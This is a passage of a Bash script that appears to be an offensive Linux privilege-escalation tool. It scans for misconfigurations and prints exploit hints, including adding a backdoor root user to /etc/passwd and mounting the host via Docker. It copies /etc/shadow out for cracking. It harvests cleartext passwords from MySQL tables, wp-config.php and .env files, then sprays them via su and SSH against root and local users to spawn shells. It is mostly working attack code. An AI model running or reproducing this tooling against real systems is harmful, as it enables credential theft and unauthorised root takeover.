                grep -vE "^#|^$" "$dcf" 2>/dev/null | while read dcl; do
                    local dcmd=$(echo "$dcl" | awk '{for(i=6;i<=NF;i++) printf $i" "; print ""}' | xargs)
                    local dfirst=$(echo "$dcmd" | awk '{print $1}')
                    if [ -n "$dfirst" ] && [ -f "$dfirst" ] && [ -w "$dfirst" ]; then
                        log_critical "    WRITABLE cron script: $dfirst"
                        echo "CRON_WRITABLE: $dfirst" >> "$REPORT_FILE"
                        sys_misconfig=$((sys_misconfig + 1))
                    fi
                done
            done

            if [ -w "$cf" ]; then
                log_critical "  WRITABLE cron directory: $cf"
                echo "CRON_MISCONFIG: Writable $cf" >> "$REPORT_FILE"
                sys_misconfig=$((sys_misconfig + 1))
            fi
        fi
    done

    # Cron PATH hijack
    local cron_path=$(grep "^PATH" /etc/crontab 2>/dev/null | cut -d= -f2)
    if [ -n "$cron_path" ]; then
        log_info "  Cron PATH: $cron_path"
        IFS=: read -ra cron_dirs <<< "$cron_path"
        for cdir in "${cron_dirs[@]}"; do
            if [ -w "$cdir" ]; then
                log_critical "  WRITABLE directory in cron PATH: $cdir"
                log_exploit "  Drop malicious binary to hijack cron commands!"
                echo "CRON_PATH_HIJACK: $cdir" >> "$REPORT_FILE"
                sys_misconfig=$((sys_misconfig + 1))
            fi
        done
    fi

    # Wildcard injection in cron
    local wildcard_crons=$(grep -r "\*" /etc/crontab /etc/cron.d/ 2>/dev/null | grep -E "tar |rsync |chown |chmod " | grep -v "^#")
    if [ -n "$wildcard_crons" ]; then
        log_critical "  Potential wildcard injection in cron:"
        echo "$wildcard_crons" | while read wcl; do
            log_exploit "    $wcl"
            echo "CRON_WILDCARD: $wcl" >> "$REPORT_FILE"
        done
        sys_misconfig=$((sys_misconfig + 1))
    fi

    # systemd timers
    local timers=$(systemctl list-timers --all 2>/dev/null | grep -v "^$\|NEXT\|timers listed")
    if [ -n "$timers" ]; then
        log_info "  Active systemd timers:"
        echo "$timers" | head -10 | while read tl; do log_info "    $tl"; done
    fi

    # --- 5. Linux Capabilities ---
    log_info "[SysMisconfig 5/14] Checking file capabilities..."

    if command -v getcap &>/dev/null; then
        local caps=$(getcap -r / 2>/dev/null | grep -v "Permission denied")

        if [ -n "$caps" ]; then
            log_success "Files with capabilities:"
            echo "$caps" | while read cl; do
                log_info "  $cl"

                if echo "$cl" | grep -qiE "cap_setuid|cap_setgid|cap_dac_override|cap_sys_admin|cap_sys_ptrace|cap_net_raw|cap_fowner|cap_chown"; then
                    local cap_file=$(echo "$cl" | awk '{print $1}')
                    log_critical "  EXPLOITABLE capability: $cl"
                    echo "CAP_EXPLOIT: $cl" >> "$REPORT_FILE"
                    sys_misconfig=$((sys_misconfig + 1))

                    local cap_name=$(basename "$cap_file")
                    case "$cap_name" in
                        python*|perl|ruby|php|node)
                            log_exploit "    $cap_name with caps = direct root shell!"
                            ;;
                    esac
                fi
            done
        fi
    else
        log_info "  getcap not found - skipping"
    fi

    # --- 6. Docker / LXC Group ---
    log_info "[SysMisconfig 6/14] Checking container access..."

    local current_groups=$(groups 2>/dev/null)

    if echo "$current_groups" | grep -qw "docker"; then
        log_critical "Current user is in DOCKER group!"
        log_exploit "  docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
        echo "DOCKER_GROUP: $(whoami) in docker group" >> "$REPORT_FILE"
        sys_misconfig=$((sys_misconfig + 1))

        if command -v docker &>/dev/null; then
            local docker_sock=$(ls -la /var/run/docker.sock 2>/dev/null)
            if [ -n "$docker_sock" ]; then
                log_exploit "  Docker socket accessible: $docker_sock"
            fi
        fi
    fi

    if echo "$current_groups" | grep -qw "lxd\|lxc"; then
        log_critical "Current user is in LXD/LXC group!"
        log_exploit "  Can mount host filesystem via container!"
        echo "LXD_GROUP: $(whoami) in lxd/lxc group" >> "$REPORT_FILE"
        sys_misconfig=$((sys_misconfig + 1))
    fi

    # Docker socket world-accessible
    if [ -S /var/run/docker.sock ]; then
        local dsock_perms=$(stat -c "%a" /var/run/docker.sock 2>/dev/null)
        if [ -w /var/run/docker.sock ]; then
            log_critical "Docker socket WRITABLE: /var/run/docker.sock ($dsock_perms)"
            echo "DOCKER_SOCK: writable" >> "$REPORT_FILE"
            sys_misconfig=$((sys_misconfig + 1))
        fi
    fi

    # --- 7. Writable /etc/passwd ---
    log_info "[SysMisconfig 7/14] Checking /etc/passwd & /etc/shadow..."

    if [ -w /etc/passwd ]; then
        log_critical "/etc/passwd is WRITABLE!"
        log_exploit "  Add root user: echo 'backdoor::0:0::/root:/bin/bash' >> /etc/passwd"
        echo "PASSWD_WRITABLE: /etc/passwd" >> "$REPORT_FILE"
        sys_misconfig=$((sys_misconfig + 1))
    fi

    if [ -r /etc/shadow ]; then
        log_critical "/etc/shadow is READABLE!"
        echo "SHADOW_READABLE: /etc/shadow" >> "$REPORT_FILE"
        sys_misconfig=$((sys_misconfig + 1))

        cp /etc/shadow /tmp/.shadow_dump_$$ 2>/dev/null
        log_info "  Shadow saved to /tmp/.shadow_dump_$$"
        log_info "  Crack: john /tmp/.shadow_dump_$$ or hashcat -m 1800"
    fi

    if [ -w /etc/shadow ]; then
        log_critical "/etc/shadow is WRITABLE!"
        echo "SHADOW_WRITABLE: /etc/shadow" >> "$REPORT_FILE"
        sys_misconfig=$((sys_misconfig + 1))
    fi

    # --- 8. World-Writable Files & Directories ---
    log_info "[SysMisconfig 8/14] Checking world-writable locations..."

    local ww_dirs=$(find /etc /usr /var/www /opt -maxdepth 3 -writable -type d 2>/dev/null | grep -v "/proc\|/sys\|/tmp\|/dev" | head -20)
    if [ -n "$ww_dirs" ]; then
        log_warning "World-writable directories in sensitive locations:"
        echo "$ww_dirs" | while read wd; do
            log_warning "  $wd"
            echo "WW_DIR: $wd" >> "$REPORT_FILE"
        done
        sys_misconfig=$((sys_misconfig + 1))
    fi

    # Writable scripts in /usr/local/bin, /usr/bin, etc
    local ww_bins=$(find /usr/local/bin /usr/local/sbin /usr/bin /usr/sbin -maxdepth 1 -writable -type f 2>/dev/null | head -20)
    if [ -n "$ww_bins" ]; then
        log_critical "WRITABLE binaries in system PATH:"
        echo "$ww_bins" | while read wb; do
            log_exploit "  $wb"
            echo "WW_BIN: $wb" >> "$REPORT_FILE"
        done
        sys_misconfig=$((sys_misconfig + 1))
    fi

    # --- 9. NFS Misconfiguration ---
    log_info "[SysMisconfig 9/14] Checking NFS exports..."

    if [ -r /etc/exports ]; then
        local exports=$(cat /etc/exports 2>/dev/null | grep -vE "^#|^$")
        if [ -n "$exports" ]; then
            log_success "NFS exports found:"
            echo "$exports" | while read el; do
                log_info "  $el"

                if echo "$el" | grep -q "no_root_squash"; then
                    log_critical "  no_root_squash enabled! Mount + create SUID = root!"
                    echo "NFS_NOSQUASH: $el" >> "$REPORT_FILE"
                    sys_misconfig=$((sys_misconfig + 1))
                fi

                if echo "$el" | grep -q "no_all_squash"; then
                    log_warning "  no_all_squash: files created retain remote user UID"
                fi

                if echo "$el" | grep -qE "\*|0\.0\.0\.0/0"; then
                    log_critical "  NFS exported to EVERYONE!"
                    sys_misconfig=$((sys_misconfig + 1))
                fi
            done
        fi
    fi

    # Check mounted NFS
    local nfs_mounts=$(mount 2>/dev/null | grep nfs)
    if [ -n "$nfs_mounts" ]; then
        log_info "  Active NFS mounts:"
        echo "$nfs_mounts" | while read nm; do log_info "    $nm"; done
    fi

    # --- 10. Kernel Exploits ---
    log_info "[SysMisconfig 10/14] Checking kernel version..."

    local kernel_version=$(uname -r)
    local kernel_major=$(echo "$kernel_version" | cut -d. -f1)
    local kernel_minor=$(echo "$kernel_version" | cut -d. -f2)

    log_info "  Kernel: $kernel_version"
    echo "KERNEL: $kernel_version" >> "$REPORT_FILE"

    # Check known vulnerable kernels
    if [ "$kernel_major" -lt 4 ] 2>/dev/null; then
        log_critical "  Kernel < 4.x - multiple known exploits (DirtyCow, etc)"
        echo "KERNEL_VULN: < 4.x" >> "$REPORT_FILE"
        sys_misconfig=$((sys_misconfig + 1))
    elif [ "$kernel_major" -eq 4 ] 2>/dev/null; then
        log_warning "  Kernel 4.x - check for DirtyCow (CVE-2016-5195), DCCP (CVE-2017-6074)"
    elif [ "$kernel_major" -eq 5 ] 2>/dev/null; then
        if [ "$kernel_minor" -lt 15 ] 2>/dev/null; then
            log_warning "  Kernel 5.x < 5.15 - check DirtyPipe (CVE-2022-0847), Sequoia (CVE-2021-33909)"
        fi
    fi

    # Check if kernel modules can be loaded
    if [ -w /lib/modules/ ] 2>/dev/null; then
        log_critical "  /lib/modules/ is writable - kernel module injection possible!"
        sys_misconfig=$((sys_misconfig + 1))
    fi

    # Check dmesg readable
    local dmesg_restrict=$(cat /proc/sys/kernel/dmesg_restrict 2>/dev/null)
    if [ "$dmesg_restrict" == "0" ]; then
        log_info "  dmesg unrestricted (kernel messages readable)"
    fi

    # --- 11. PATH Hijack ---
    log_info "[SysMisconfig 11/14] Checking PATH hijacking..."

    local current_path="$PATH"
    log_info "  PATH: $current_path"

    IFS=: read -ra path_dirs <<< "$current_path"
    for pdir in "${path_dirs[@]}"; do
        if [ -z "$pdir" ] || [ "$pdir" == "." ]; then
            log_critical "  EMPTY or DOT (.) in PATH - current directory hijack!"
            echo "PATH_HIJACK: dot/empty in PATH" >> "$REPORT_FILE"
            sys_misconfig=$((sys_misconfig + 1))
            continue
        fi

        if [ -w "$pdir" ]; then
            log_critical "  WRITABLE PATH directory: $pdir"
            echo "PATH_HIJACK: writable $pdir" >> "$REPORT_FILE"
            sys_misconfig=$((sys_misconfig + 1))
        fi
    done

    # Check relative paths in scripts run by root
    local root_scripts=$(find /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/init.d -type f -readable 2>/dev/null)
    if [ -n "$root_scripts" ]; then
        echo "$root_scripts" | while read rs; do
            local rel_path=$(grep -nE "^[a-zA-Z_]+[^/]" "$rs" 2>/dev/null | grep -vE "^#|^$|if |then|else|fi|do|done|echo|exit|case|esac|local|export|source" | head -3)
            if [ -n "$rel_path" ]; then
                local has_relative=$(echo "$rel_path" | grep -vE "^[0-9]+:\s*/")
                if [ -n "$has_relative" ]; then
                    log_warning "  Possible relative path in root script $rs"
                fi
            fi
        done
    fi

    # --- 12. SSH Misconfiguration ---
    log_info "[SysMisconfig 12/14] Checking SSH configuration..."

    local sshd_config="/etc/ssh/sshd_config"
    if [ -r "$sshd_config" ]; then
        log_success "  sshd_config readable: $sshd_config"

        local permit_root=$(grep -i "^PermitRootLogin" "$sshd_config" 2>/dev/null | awk '{print $2}')
        if [ "$permit_root" == "yes" ]; then
            log_warning "  PermitRootLogin = yes"
            echo "SSH_MISCONFIG: PermitRootLogin yes" >> "$REPORT_FILE"
            sys_misconfig=$((sys_misconfig + 1))
        fi

        local pass_auth=$(grep -i "^PasswordAuthentication" "$sshd_config" 2>/dev/null | awk '{print $2}')
        if [ "$pass_auth" == "yes" ]; then
            log_info "  PasswordAuthentication = yes (brute-force possible)"
        fi

        local permit_empty=$(grep -i "^PermitEmptyPasswords" "$sshd_config" 2>/dev/null | awk '{print $2}')
        if [ "$permit_empty" == "yes" ]; then
            log_critical "  PermitEmptyPasswords = yes!"
            echo "SSH_MISCONFIG: PermitEmptyPasswords yes" >> "$REPORT_FILE"
            sys_misconfig=$((sys_misconfig + 1))
        fi

        local agent_fwd=$(grep -i "^AllowAgentForwarding" "$sshd_config" 2>/dev/null | awk '{print $2}')
        if [ "$agent_fwd" != "no" ]; then
            log_info "  AgentForwarding enabled (SSH agent hijacking possible)"
        fi
    fi

    # Writable SSH config
    if [ -w "$sshd_config" ]; then
        log_critical "  sshd_config is WRITABLE!"
        echo "SSH_MISCONFIG: writable sshd_config" >> "$REPORT_FILE"
        sys_misconfig=$((sys_misconfig + 1))
    fi

    # Check authorized_keys writable in other users' homes
    find /home /root -maxdepth 3 -name "authorized_keys" 2>/dev/null | while read ak; do
        if [ -w "$ak" ]; then
            log_critical "  WRITABLE authorized_keys: $ak"
            log_exploit "  Can inject SSH key for access!"
            echo "SSH_WRITABLE_AUTHKEYS: $ak" >> "$REPORT_FILE"
            sys_misconfig=$((sys_misconfig + 1))
        fi
    done

    # Check writable .ssh directories
    find /home /root -maxdepth 2 -name ".ssh" -type d 2>/dev/null | while read sd; do
        if [ -w "$sd" ]; then
            log_critical "  WRITABLE .ssh directory: $sd"
            echo "SSH_WRITABLE_DIR: $sd" >> "$REPORT_FILE"
            sys_misconfig=$((sys_misconfig + 1))
        fi
    done

    # --- 13. Service Misconfiguration ---
    log_info "[SysMisconfig 13/14] Checking service configurations..."

    # Apache/Nginx writable configs
    local web_configs=("/etc/apache2/apache2.conf" "/etc/apache2/sites-enabled/"
                      "/etc/nginx/nginx.conf" "/etc/nginx/sites-enabled/"
                      "/etc/httpd/conf/httpd.conf")

    for wc in "${web_configs[@]}"; do
        if [ -e "$wc" ] && [ -w "$wc" ]; then
            log_critical "  WRITABLE web config: $wc"
            echo "SVC_MISCONFIG: Writable $wc" >> "$REPORT_FILE"
            sys_misconfig=$((sys_misconfig + 1))
        fi
    done

    # Webroot writable
    local web_roots=("/var/www/html" "/var/www" "/usr/share/nginx/html" "/srv/http")
    for wr in "${web_roots[@]}"; do
        if [ -d "$wr" ] && [ -w "$wr" ]; then
            log_warning "  WRITABLE webroot: $wr"
            echo "SVC_MISCONFIG: Writable webroot $wr" >> "$REPORT_FILE"
            sys_misconfig=$((sys_misconfig + 1))
        fi
    done

    # Redis no auth
    if command -v redis-cli &>/dev/null; then
        local redis_test=$(redis-cli -h 127.0.0.1 ping 2>/dev/null)
        if [ "$redis_test" == "PONG" ]; then
            log_critical "  Redis accessible WITHOUT authentication!"
            log_exploit "  Can write SSH keys or webshell via Redis"
            echo "SVC_MISCONFIG: Redis no auth" >> "$REPORT_FILE"
            sys_misconfig=$((sys_misconfig + 1))
        fi
    fi

    # Check for running services
    local services_list=$(ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null)
    if [ -n "$services_list" ]; then
        log_info "  Listening services:"
        echo "$services_list" | grep -v "^State\|^Active" | head -20 | while read svl; do
            log_info "    $svl"
        done

        # Interesting ports
        if echo "$services_list" | grep -q ":6379"; then
            log_warning "  Redis (6379) detected"
        fi
        if echo "$services_list" | grep -q ":27017"; then
            log_warning "  MongoDB (27017) detected"
        fi
        if echo "$services_list" | grep -q ":11211"; then
            log_warning "  Memcached (11211) detected"
        fi
        if echo "$services_list" | grep -q ":9200"; then
            log_warning "  Elasticsearch (9200) detected"
        fi
    fi

    # --- 14. Writable init/systemd & LD_PRELOAD ---
    log_info "[SysMisconfig 14/14] Checking init scripts & shared libraries..."

    # Writable init.d scripts
    local writable_init=$(find /etc/init.d -writable -type f 2>/dev/null)
    if [ -n "$writable_init" ]; then
        log_critical "WRITABLE init.d scripts:"
        echo "$writable_init" | while read wi; do
            log_exploit "  $wi"
            echo "INIT_WRITABLE: $wi" >> "$REPORT_FILE"
        done
        sys_misconfig=$((sys_misconfig + 1))
    fi

    # Writable systemd service files
    local writable_systemd=$(find /etc/systemd /usr/lib/systemd -writable -name "*.service" -type f 2>/dev/null)
    if [ -n "$writable_systemd" ]; then
        log_critical "WRITABLE systemd service files:"
        echo "$writable_systemd" | while read ws; do
            log_exploit "  $ws"
            echo "SYSTEMD_WRITABLE: $ws" >> "$REPORT_FILE"
        done
        sys_misconfig=$((sys_misconfig + 1))
    fi

    # Check /etc/ld.so.preload
    if [ -e /etc/ld.so.preload ]; then
        log_warning "  /etc/ld.so.preload exists!"
        log_info "  Content: $(cat /etc/ld.so.preload 2>/dev/null)"

        if [ -w /etc/ld.so.preload ]; then
            log_critical "  /etc/ld.so.preload is WRITABLE!"
            log_exploit "  Inject .so path for root code execution on any SUID!"
            echo "LDPRELOAD_WRITABLE: /etc/ld.so.preload" >> "$REPORT_FILE"
            sys_misconfig=$((sys_misconfig + 1))
        fi
    fi

    # Check ld.so.conf.d writable
    if [ -d /etc/ld.so.conf.d ] && [ -w /etc/ld.so.conf.d ]; then
        log_critical "  /etc/ld.so.conf.d is WRITABLE! Shared library injection possible!"
        echo "LDCONF_WRITABLE: /etc/ld.so.conf.d" >> "$REPORT_FILE"
        sys_misconfig=$((sys_misconfig + 1))
    fi

    # Writable shared libraries
    local writable_libs=$(find /lib /usr/lib /lib64 /usr/lib64 -maxdepth 2 -writable -name "*.so*" -type f 2>/dev/null | head -10)
    if [ -n "$writable_libs" ]; then
        log_critical "WRITABLE shared libraries:"
        echo "$writable_libs" | while read wl; do
            log_exploit "  $wl"
            echo "LIB_WRITABLE: $wl" >> "$REPORT_FILE"
        done
        sys_misconfig=$((sys_misconfig + 1))
    fi

    # Summary
    echo "" | tee -a "$REPORT_FILE"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" | tee -a "$REPORT_FILE"

    if [ $sys_misconfig -gt 0 ]; then
        log_critical "SYSTEM MISCONFIGURATIONS FOUND: $sys_misconfig"

        if [ $sys_misconfig -ge 10 ]; then
            log_critical "SEVERITY: CRITICAL"
        elif [ $sys_misconfig -ge 5 ]; then
            log_warning "SEVERITY: HIGH"
        else
            log_info "SEVERITY: MEDIUM"
        fi

        echo "SYS_MISCONFIG_TOTAL: $sys_misconfig" >> "$REPORT_FILE"
    else
        log_success "No significant system misconfigurations detected"
    fi

    echo ""
}

# ═══════════════════════════════════════════════════════════════
# CREDENTIAL REUSE ATTACK
# Try all collected DB credentials against system accounts
# ═══════════════════════════════════════════════════════════════

try_credential_reuse_attack() {
    local mysql_cmd="$1"

    log_exploit "==============================================="
    log_exploit "  CREDENTIAL REUSE / PASSWORD SPRAY ATTACK"
    log_exploit "  Try DB credentials against system accounts"
    log_exploit "==============================================="
    echo "" >> "$REPORT_FILE"
    echo "=== CREDENTIAL REUSE ATTACK ===" >> "$REPORT_FILE"

    # Collect all found passwords from multiple sources
    declare -A all_passwords
    declare -a password_list

    # Source 1: CREDS_FILE (from .env discovery)
    if [ -s "$CREDS_FILE" ]; then
        log_info "Loading credentials from discovery phase..."
        while IFS=: read -r cuser cpass csource; do
            if [ -n "$cpass" ]; then
                all_passwords["$cpass"]=1
                password_list+=("$cpass")
                log_info "  Collected password from $csource: $cuser:****"
            fi
        done < "$CREDS_FILE"
    fi

    # Source 2: FOUND_PASSWORDS array
    for puser in "${!FOUND_PASSWORDS[@]}"; do
        local ppass="${FOUND_PASSWORDS[$puser]}"
        if [ -n "$ppass" ]; then
            all_passwords["$ppass"]=1
            password_list+=("$ppass")
        fi
    done

    # Source 3: Extract credentials from MySQL directly
    if [ -n "$mysql_cmd" ]; then
        # Try extracting cleartext passwords from app tables
        local app_creds=$($mysql_cmd -N -e "
            SELECT DISTINCT c.COLUMN_NAME, t.TABLE_SCHEMA, t.TABLE_NAME
            FROM information_schema.COLUMNS c
            JOIN information_schema.TABLES t ON c.TABLE_SCHEMA = t.TABLE_SCHEMA AND c.TABLE_NAME = t.TABLE_NAME
            WHERE c.COLUMN_NAME REGEXP 'password|passwd|pass'
            AND t.TABLE_SCHEMA NOT IN ('information_schema','performance_schema','mysql','sys')
            AND t.TABLE_ROWS > 0
            LIMIT 10;" 2>/dev/null)

        if [ -n "$app_creds" ]; then
            echo "$app_creds" | while IFS=$'\t' read -r col schema table; do
                # Get username column
                local ucol=$($mysql_cmd -N -e "
                    SELECT COLUMN_NAME FROM information_schema.COLUMNS
                    WHERE TABLE_SCHEMA='${schema}' AND TABLE_NAME='${table}'
                    AND COLUMN_NAME REGEXP 'user|username|login|email|name'
                    LIMIT 1;" 2>/dev/null)

                if [ -n "$ucol" ]; then
                    local rows=$($mysql_cmd -N -e "SELECT \`${ucol}\`, \`${col}\` FROM \`${schema}\`.\`${table}\` LIMIT 50;" 2>/dev/null)
                else
                    local rows=$($mysql_cmd -N -e "SELECT \`${col}\` FROM \`${schema}\`.\`${table}\` LIMIT 50;" 2>/dev/null)
                fi

                if [ -n "$rows" ]; then
                    echo "$rows" | while IFS=$'\t' read -r field1 field2; do
                        local pass_val=""
                        if [ -n "$field2" ]; then
                            pass_val="$field2"
                        else
                            pass_val="$field1"
                        fi

                        # Skip hashed passwords (bcrypt, md5, sha, etc)
                        if echo "$pass_val" | grep -qE '^\$2[aby]\$|^\$1\$|^\$5\$|^\$6\$|^[a-f0-9]{32}$|^[a-f0-9]{40}$|^[a-f0-9]{64}$'; then
                            continue
                        fi

                        if [ -n "$pass_val" ] && [ ${#pass_val} -ge 3 ] && [ ${#pass_val} -le 64 ]; then
                            all_passwords["$pass_val"]=1
                            echo "$pass_val" >> /tmp/.reuse_passwords_$$
                        fi
                    done
                fi
            done
        fi

        # Extract MySQL user passwords from debian.cnf
        local deb_pass=$($mysql_cmd -N -e "SELECT LOAD_FILE('/etc/mysql/debian.cnf');" 2>/dev/null)
        if [ -n "$deb_pass" ] && [ "$deb_pass" != "NULL" ]; then
            local extracted_pass=$(echo "$deb_pass" | grep "^password" | awk '{print $3}' | head -1)
            if [ -n "$extracted_pass" ]; then
                all_passwords["$extracted_pass"]=1
                password_list+=("$extracted_pass")
                log_info "  Collected debian-sys-maint password"
            fi
        fi

        # Extract from wp-config.php, .env, etc via LOAD_FILE
        local wp_config=$($mysql_cmd -N -e "SELECT LOAD_FILE('/var/www/html/wp-config.php');" 2>/dev/null)
        if [ -n "$wp_config" ] && [ "$wp_config" != "NULL" ]; then
            local wp_pass=$(echo "$wp_config" | grep "DB_PASSWORD" | head -1 | grep -oP "'[^']+'" | tail -1 | tr -d "'")
            if [ -n "$wp_pass" ]; then
                all_passwords["$wp_pass"]=1
                password_list+=("$wp_pass")
                log_info "  Collected WordPress DB password"
            fi
        fi

        local env_files=("/var/www/html/.env" "/var/www/.env" "/opt/.env" "/srv/.env")
        for efile in "${env_files[@]}"; do
            local env_content=$($mysql_cmd -N -e "SELECT LOAD_FILE('${efile}');" 2>/dev/null)
            if [ -n "$env_content" ] && [ "$env_content" != "NULL" ]; then
                local env_pass=$(echo "$env_content" | grep -iE "DB_PASSWORD|DB_PASS|PASSWORD|SECRET" | cut -d= -f2 | tr -d "'" | tr -d '"' | tr -d ' ')
                if [ -n "$env_pass" ]; then
                    echo "$env_pass" | while read ep; do
                        if [ -n "$ep" ] && [ ${#ep} -ge 3 ]; then
                            all_passwords["$ep"]=1
                            echo "$ep" >> /tmp/.reuse_passwords_$$
                        fi
                    done
                fi
            fi
        done
    fi

    # Load from temp file if exists
    if [ -s /tmp/.reuse_passwords_$$ ]; then
        while read rpass; do
            all_passwords["$rpass"]=1
            password_list+=("$rpass")
        done < /tmp/.reuse_passwords_$$
        rm -f /tmp/.reuse_passwords_$$
    fi

    # Remove duplicates and empty entries
    local unique_passwords=()
    declare -A seen_pass
    for p in "${password_list[@]}"; do
        if [ -n "$p" ] && [ -z "${seen_pass[$p]}" ]; then
            seen_pass["$p"]=1
            unique_passwords+=("$p")
        fi
    done

    # Also add from all_passwords keys
    for p in "${!all_passwords[@]}"; do
        if [ -n "$p" ] && [ -z "${seen_pass[$p]}" ]; then
            seen_pass["$p"]=1
            unique_passwords+=("$p")
        fi
    done

    local total_passwords=${#unique_passwords[@]}
    log_info "Total unique passwords collected: $total_passwords"

    if [ $total_passwords -eq 0 ]; then
        log_warning "No passwords collected - skipping credential reuse attack"
        return 1
    fi

    echo "Passwords collected: $total_passwords" >> "$REPORT_FILE"

    # Collect target system users
    local target_users=()

    # Always try root first
    target_users+=("root")

    # Add users with UID >= 1000 (regular users) and UID 0
    while IFS=: read -r uname x uid gid gecos home shell; do
        if [ "$uname" == "root" ]; then
            continue
        fi

        # Skip nologin/false shell users
        if echo "$shell" | grep -qE "nologin|false|sync|halt|shutdown"; then
            continue
        fi

        if [ "$uid" -ge 1000 ] 2>/dev/null || [ "$uid" -eq 0 ] 2>/dev/null; then
            target_users+=("$uname")
        fi
    done < /etc/passwd

    # Also add MySQL process user if it's a real user
    if [ -n "$MYSQL_PROCESS_USER" ] && [ "$MYSQL_PROCESS_USER" != "root" ]; then
        target_users+=("$MYSQL_PROCESS_USER")
    fi

    local total_users=${#target_users[@]}
    log_info "Target system users: $total_users"
    log_info "Users: ${target_users[*]}"
    echo "Target users: ${target_users[*]}" >> "$REPORT_FILE"

    echo ""
    log_info "Starting credential reuse attack ($total_passwords passwords x $total_users users)..."
    echo ""

    # --- Method 1: su (most reliable) ---
    log_exploit "[Reuse M1] Trying 'su' login with collected passwords..."

    for target in "${target_users[@]}"; do
        for pass in "${unique_passwords[@]}"; do
            # Use expect if available for su
            if command -v expect &>/dev/null; then
                local su_result=$(expect -c "
                    log_user 0
                    set timeout 5
                    spawn su - $target -c whoami
                    expect {
                        \"Password:\" { send \"$pass\r\" }
                        \"password:\" { send \"$pass\r\" }
                        \"assword\" { send \"$pass\r\" }
                        timeout { exit 1 }
                    }
                    expect {
                        \"$target\" { exit 0 }
                        \"root\" { exit 0 }
                        \"failure\" { exit 1 }
                        \"incorrect\" { exit 1 }
                        \"Authentication\" { exit 1 }
                        timeout { exit 1 }
                    }
                " 2>/dev/null)

                if [ $? -eq 0 ]; then
                    log_critical "SU LOGIN SUCCESS: $target with password '$pass'"
                    echo "REUSE SUCCESS [su]: $target / $pass" >> "$REPORT_FILE"
                    SUCCESS=1
                    ESCALATION_METHOD="Credential Reuse (su): DB password on $target"
                    TARGET_USER="$target"

                    if [ "$target" == "root" ]; then
                        log_exploit "ROOT ACCESS via credential reuse!"
                        log_info "Spawning root shell..."

                        expect -c "
                            set timeout 5
                            spawn su - root
                            expect \"*assword*\"
                            send \"$pass\r\"
                            interact
                        " 2>/dev/null

                        return 0
                    else
                        log_success "Access as $target achieved!"
                        log_info "Spawning interactive shell as $target..."

                        expect -c "
                            set timeout 5
                            spawn su - $target
                            expect \"*assword*\"
                            send \"$pass\r\"
                            interact
                        " 2>/dev/null

                        return 0
                    fi
                fi

            # Fallback: use sshpass + su via pipe
            else
                local su_test=$(echo "$pass" | timeout 5 su - "$target" -c "whoami" 2>/dev/null)

                if [ -n "$su_test" ] && ([ "$su_test" == "$target" ] || [ "$su_test" == "root" ]); then
                    log_critical "SU LOGIN SUCCESS: $target with password '$pass'"
                    echo "REUSE SUCCESS [su]: $target / $pass" >> "$REPORT_FILE"
                    SUCCESS=1
                    ESCALATION_METHOD="Credential Reuse (su): DB password on $target"
                    TARGET_USER="$target"
                    echo "$target:$pass:verified_reuse" >> "$CREDS_FILE"

                    if [ "$target" == "root" ]; then
                        log_exploit "ROOT ACCESS via credential reuse!"
                    fi

                    # Try sshpass for interactive shell
                    if command -v sshpass &>/dev/null; then
                        log_info "Spawning interactive shell via SSH..."
                        sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password "$target@localhost"
                        return 0
                    fi

                    # Try python3 pty
                    if command -v python3 &>/dev/null; then
                        log_info "Spawning interactive shell via python3 pty..."
                        python3 -c "
import pty, os, time, select
pid, fd = pty.fork()
if pid == 0:
    os.execvp('su', ['su', '-', '$target'])
else:
    time.sleep(0.5)
    os.write(fd, b'$pass\n')
    while True:
        r, _, _ = select.select([fd, 0], [], [], 0.1)
        if fd in r:
            try:
                data = os.read(fd, 1024)
                if not data: break
                os.write(1, data)
            except: break
        if 0 in r:
            data = os.read(0, 1024)
            os.write(fd, data)
" 2>/dev/null
                        return 0
                    fi

                    log_info "Shell will be spawned by drop_to_shell()"
                    return 0
                fi
            fi
        done
    done

    log_info "su login: no matches found"

    # --- Method 2: SSH with password (via sshpass) ---
    log_exploit "[Reuse M2] Trying SSH login with collected passwords..."

    if command -v sshpass &>/dev/null; then
        for target in "${target_users[@]}"; do
            for pass in "${unique_passwords[@]}"; do
                local ssh_result=$(sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o PreferredAuthentications=password "$target@localhost" "whoami" 2>/dev/null)

                if [ -n "$ssh_result" ] && ([ "$ssh_result" == "$target" ] || [ "$ssh_result" == "root" ]); then
                    log_critical "SSH LOGIN SUCCESS: $target@localhost with password '$pass'"
                    echo "REUSE SUCCESS [ssh]: $target / $pass" >> "$REPORT_FILE"
                    SUCCESS=1
                    ESCALATION_METHOD="Credential Reuse (SSH): DB password on $target"
                    TARGET_USER="$target"

                    if [ "$target" == "root" ]; then
                        log_exploit "ROOT SSH ACCESS via credential reuse!"
                    fi

                    log_info "Spawning shell via SSH..."
                    sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$target@localhost"
                    return 0
                fi
            done
        done
        log_info "SSH login: no matches found"
    else
        log_warning "sshpass not installed - trying SSH with expect..."

        if command -v expect &>/dev/null; then
            for target in "${target_users[@]}"; do
                for pass in "${unique_passwords[@]}"; do
                    local ssh_expect=$(expect -c "
                        log_user 0
                        set timeout 8
                        spawn ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password $target@localhost whoami
                        expect {
                            \"*assword*\" { send \"$pass\r\" }
                            timeout { exit 1 }
                        }
                        expect {
                            \"$target\" { exit 0 }
                            \"root\" { exit 0 }
                            \"denied\" { exit 1 }
                            \"Permission\" { exit 1 }
                            timeout { exit 1 }
                        }
                    " 2>/dev/null)

                    if [ $? -eq 0 ]; then
                        log_critical "SSH LOGIN SUCCESS: $target@localhost with password '$pass'"
                        echo "REUSE SUCCESS [ssh-expect]: $target / $pass" >> "$REPORT_FILE"
                        SUCCESS=1
                        ESCALATION_METHOD="Credential Reuse (SSH): DB password on $target"
                        TARGET_USER="$target"

                        log_info "Spawning shell..."
                        expect -c "
                            set timeout 8
                            spawn ssh -o StrictHostKeyChecking=no $target@localhost
                            expect \"*assword*\"
                            send \"$pass\r\"
                            interact
                        " 2>/dev/null
                        return 0
                    fi
                done
            done
            log_info "SSH (expect) login: no matches found"
        else
            log_warning "Neither sshpass nor expect available - SSH password brute skipped"
        fi
    fi

